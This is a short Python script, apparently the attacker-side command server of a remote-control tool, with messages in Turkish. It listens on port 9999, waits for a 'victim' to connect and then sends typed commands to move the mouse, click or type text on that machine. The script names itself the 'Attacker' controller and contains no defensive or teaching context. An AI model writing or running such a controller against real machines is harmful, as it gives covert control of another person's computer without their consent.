import socket

print("--- REMOTE MOUSE CONTROLLER (Attacker) ---")
s = socket.socket()
s.bind(('0.0.0.0', 9999))
s.listen(1)
print("Bağlantı bekleniyor...")
conn, addr = s.accept()
print(f"Kurban Bağlandı: {addr}")

while True:
    cmd = input("Komut (move x y / click / type text): ")
    conn.send(cmd.encode())